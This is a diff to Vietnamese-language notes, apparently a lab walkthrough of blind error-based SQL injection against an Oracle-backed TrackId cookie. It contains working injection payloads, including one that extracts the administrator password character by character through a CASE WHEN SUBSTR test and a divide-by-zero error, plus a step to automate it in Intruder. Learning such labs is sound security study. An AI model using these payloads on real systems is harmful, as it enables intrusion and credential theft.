@@ -11,6 +11,7 @@
 # Solution:
 - ' -> 500
 - '' -> 200
+
 (TrackId= 'xyz''' nếu viết 1 cái thì bị lỗi do thừa, còn 2 cái thì nó kết thành 2 cái kiểu chuỗi nối với nhau ý, nên nó ko lỗi nữa)
 
 - ' || (SELECT '') ||' -> 500
@@ -38,7 +39,7 @@ Check độ dài pass thì là 20
 
 ' || (SELECT CASE WHEN SUBSTRING(password,1,1) = 'a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'
 
-Sai ở SUBSTRING nhé, dùng SUBSTR() với Oracle nè.
+**Sai ở SUBSTRING nhé, dùng SUBSTR() với Oracle**
 
 - Xong đẩy lên Intruder: 
 
